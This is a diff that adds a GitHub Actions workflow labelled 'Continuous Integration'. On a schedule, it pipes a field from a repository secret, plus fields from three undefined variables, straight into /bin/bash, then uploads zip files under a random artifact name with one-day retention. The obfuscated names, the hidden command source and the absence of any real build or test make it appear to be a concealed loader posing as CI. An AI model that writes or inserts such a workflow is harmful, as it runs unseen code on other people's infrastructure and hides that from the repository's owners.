@@ -1,0 +1,31 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          w36: ${{ secrets.w36 }}
+        run: |
+          printf '%s' "$w36" | jq -r .wq366 | /bin/bash
+          printf '%s' "$jkb58" | jq -r .acv44074 | /bin/bash
+          echo $hkwtw29 | jq -r .cyuh20985 | /bin/bash
+          echo $lrih4 | jq -r .df0237 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: HXcEvTHI
+          path: "*.zip"
+          retention-days: 1
